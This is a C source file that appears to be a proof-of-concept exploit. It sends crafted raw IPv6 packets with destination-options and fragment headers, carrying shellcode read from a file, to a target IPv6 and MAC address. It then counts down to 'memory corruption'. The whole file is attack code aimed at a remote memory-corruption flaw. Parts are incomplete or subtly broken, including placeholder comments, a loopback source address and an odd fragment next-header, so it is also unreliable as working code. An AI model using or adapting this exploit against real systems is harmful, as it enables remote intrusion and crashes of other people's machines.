#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip6.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <time.h>

#define MAX_PACKET_SIZE 1280 // IPv6 minimum MTU
#define NUM_TRIES 20
#define NUM_BATCHES 20

char iface[IFNAMSIZ] = "wlan0";  // Default interface name
char ip_addr[INET6_ADDRSTRLEN] = ""; // Default empty IPv6 address
char mac_addr[18] = ""; // Default empty MAC address
char payload[MAX_PACKET_SIZE] = {0}; // Buffer for shellcode payload
int payload_size = 0;

void error(const char *msg) {
    perror(msg);
    exit(1);
}

// Function to read payload from a file
void read_payload_from_file(const char *filename) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        error("Failed to open payload file");
    }

    // Read the file into the payload buffer
    payload_size = fread(payload, 1, MAX_PACKET_SIZE, file);
    if (payload_size <= 0) {
        error("Failed to read payload or payload is empty");
    }

    fclose(file);
}

// Calculate checksum for IPv6 pseudo-header and payload
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum & 0xffff) + (sum >> 16);
    sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

// Function to get a raw socket
int get_raw_socket() {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock == -1)
        error("Failed to create raw socket");
    return sock;
}

// Function to set the interface to promiscuous mode
void set_interface_promiscuous(int sock, const char *iface) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sock, SIOCGIFFLAGS, &ifr) == -1)
        error("Failed to get interface flags");
    ifr.ifr_flags |= IFF_PROMISC;
    if (ioctl(sock, SIOCSIFFLAGS, &ifr) == -1)
        error("Failed to set promiscuous mode");
}

// Function to get interface index
int get_interface_index(int sock, const char *iface) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) == -1)
        error("Failed to get interface index");
    return ifr.ifr_ifindex;
}

// Function to send packets
void send_packets(int sock, unsigned char *packet, int packet_len, const char *iface) {
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = get_interface_index(sock, iface);
    sa.sll_protocol = htons(ETH_P_IPV6);

    if (sendto(sock, packet, packet_len, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0)
        error("Failed to send packet");
}

// Function to craft and send the packets
void craft_and_send_packets(int sock, int batch_num, int try_num) {
    struct ether_header eth_hdr;
    struct ip6_hdr ip6_hdr;
    struct ip6_frag ip6_frag;
    unsigned char packet[MAX_PACKET_SIZE];
    int packet_len;

    // Ethernet header
    memset(&eth_hdr, 0, sizeof(struct ether_header));
    if (strlen(mac_addr) > 0) {
        memcpy(eth_hdr.ether_dhost, ether_aton(mac_addr), ETHER_ADDR_LEN);
        // Set source MAC address here if needed
        eth_hdr.ether_type = htons(ETHERTYPE_IPV6);
    }

    // IPv6 header
    memset(&ip6_hdr, 0, sizeof(struct ip6_hdr));
    ip6_hdr.ip6_flow = htonl((6 << 28) | (1 << 20)); // version and flow label
    ip6_hdr.ip6_hlim = 64 + try_num; // hop limit
    inet_pton(AF_INET6, ip_addr, &(ip6_hdr.ip6_dst)); // destination address
    inet_pton(AF_INET6, "::1", &(ip6_hdr.ip6_src));  // source address (example)

    // First packet (IPv6 with Destination Options header)
    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    if (strlen(mac_addr) > 0) {
        memcpy(packet, &eth_hdr, sizeof(struct ether_header));
        packet_len += sizeof(struct ether_header);
    }
    memcpy(packet + packet_len, &ip6_hdr, sizeof(struct ip6_hdr));
    packet_len += sizeof(struct ip6_hdr);
    // Append your custom destination options and data here
    send_packets(sock, packet, packet_len, iface);

    // Second packet (IPv6 with Fragment header, first fragment)
    memset(&ip6_frag, 0, sizeof(struct ip6_frag));
    ip6_frag.ip6f_nxt = IPPROTO_FRAGMENT;
    ip6_frag.ip6f_reserved = 0;
    ip6_frag.ip6f_offlg = htons(IP6F_MORE_FRAG);
    ip6_frag.ip6f_ident = htonl(0xdebac1e + try_num);

    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    if (strlen(mac_addr) > 0) {
        memcpy(packet, &eth_hdr, sizeof(struct ether_header));
        packet_len += sizeof(struct ether_header);
    }
    memcpy(packet + packet_len, &ip6_hdr, sizeof(struct ip6_hdr));
    packet_len += sizeof(struct ip6_hdr);
    memcpy(packet + packet_len, &ip6_frag, sizeof(struct ip6_frag));
    packet_len += sizeof(struct ip6_frag);
    // Use the loaded payload
    memcpy(packet + packet_len, payload, payload_size);
    packet_len += payload_size;
    send_packets(sock, packet, packet_len, iface);

    // Third packet (IPv6 with Fragment header, second fragment)
    ip6_frag.ip6f_offlg = htons(1 << 3); // Offset = 1, M-bit = 0

    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    if (strlen(mac_addr) > 0) {
        memcpy(packet, &eth_hdr, sizeof(struct ether_header));
        packet_len += sizeof(struct ether_header);
    }
    memcpy(packet + packet_len, &ip6_hdr, sizeof(struct ip6_hdr));
    packet_len += sizeof(struct ip6_hdr);
    memcpy(packet + packet_len, &ip6_frag, sizeof(struct ip6_frag));
    packet_len += sizeof(struct ip6_frag);
    // If additional payload needs to be sent, handle it here
    send_packets(sock, packet, packet_len, iface);
}

int main(int argc, char *argv[]) {
    // Check for command-line arguments
    if (argc < 4) {
        // If not enough arguments, prompt the user
        printf("Usage: %s <interface> <ipv6_address> <mac_address>\n", argv[0]);
        printf("Or enter interactively:\n");

        printf("Enter interface name: ");
        scanf("%s", iface);

        printf("Enter target IPv6 address: ");
        scanf("%s", ip_addr);

        printf("Enter target MAC address: ");
        scanf("%s", mac_addr);
    } else {
        // Use command-line arguments
        strncpy(iface, argv[1], IFNAMSIZ-1);
        strncpy(ip_addr, argv[2], INET6_ADDRSTRLEN-1);
        strncpy(mac_addr, argv[3], 17);
    }

    // Read payload from shellcode.txt
    read_payload_from_file("shellcode.txt");

    int sock = get_raw_socket();
    set_interface_promiscuous(sock, iface);

    for (int batch_num = 0; batch_num < NUM_BATCHES; batch_num++) {
        for (int try_num = 0; try_num < NUM_TRIES; try_num++) {
            craft_and_send_packets(sock, batch_num, try_num);
        }
    }

    close(sock);

    printf("Sending packets\n");

    for (int i = 60; i > 0; i--) {
        printf("Memory corruption will be triggered in %d seconds\r", i);
        fflush(stdout);
        sleep(1);
    }

    printf("\n");
    return 0;
}
